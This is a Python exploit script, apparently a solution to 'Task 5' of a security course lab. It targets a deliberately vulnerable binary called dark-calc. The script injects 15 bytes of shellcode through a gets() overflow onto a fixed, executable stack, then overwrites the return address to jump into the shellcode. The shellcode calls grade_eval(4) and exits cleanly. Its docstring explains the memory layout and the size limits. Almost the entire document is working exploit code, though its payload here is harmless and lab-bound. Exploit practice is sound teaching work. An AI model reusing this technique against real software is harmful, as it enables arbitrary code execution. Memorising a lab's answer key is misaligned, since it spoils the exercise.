#!/usr/bin/env python3
"""Task 5 payload: execute shellcode on dark-calc's dedicated RWX stack.

dark-calc's constructor init_fixed_stack() maps 8 MiB at a fixed address and
makes it read/write/execute, with PROT_NONE guard pages on both ends:

    0x721000000000 - 0x721000001000   ---p   guard
    0x721000001000 - 0x721000801000   rwxp   fixed stack (8 MiB)
    0x721000801000 - 0x721000802000   ---p   guard

__wrap_main() then sets rsp = fixed_stack_top (0x721000801000) and calls main.
Because the mapping address is fixed, the stack is not randomised and the input
buffer is always at 0x721000800fd0.  The buffer is only 16 bytes below the
saved rbp, but this payload's shellcode is 15 bytes, so it fits entirely inside
the buffer and the return address at offset 24 simply jumps back to the buffer:

    0x721000800fd0  6a 04           push 4
    0x721000800fd2  5f              pop  rdi
    0x721000800fd3  48 b8 <addr>    movabs rax, 0x401a87   ; grade_eval
    0x721000800fdd  ff e0           jmp  rax

grade_eval(4) prints "Hope A will be your grade!".  It returns to the qword at
0x721000800ff0, which this payload sets to 0x4019b9 (`mov edi, 0; call
exit@plt`), so the process terminates cleanly with status 0.

Note the 48-byte window: the NUL terminator written by gets() must land at or
below 0x721000800fff, hence payloads on this binary are limited to 47 bytes.
This one is 40 bytes (including the trailing newline delimiter).
"""
import struct
import sys

# nm attack/dark-calc
GRADE_EVAL = 0x401A87
EXIT0_CALL_SITE = 0x4019B9   # input()+0x42: mov edi, 0; call exit@plt
STACK_BUFFER = 0x721000800FD0

shellcode = b"\x6a\x04"                       # push 4
shellcode += b"\x5f"                          # pop rdi
shellcode += b"\x48\xb8" + struct.pack("<Q", GRADE_EVAL)  # movabs rax, grade_eval
shellcode += b"\xff\xe0"                      # jmp rax

payload = shellcode.ljust(24, b"\x90")        # NOP padding up to saved rbp
payload += struct.pack("<Q", STACK_BUFFER)    # return address -> shellcode
payload += struct.pack("<Q", EXIT0_CALL_SITE) # grade_eval returns -> exit(0)
payload += b"\n"

assert len(shellcode) <= 24
assert len(payload) <= 47, "gets() NUL must not touch the PROT_NONE guard page"
assert b"\n" not in payload[:-1]
sys.stdout.buffer.write(payload)
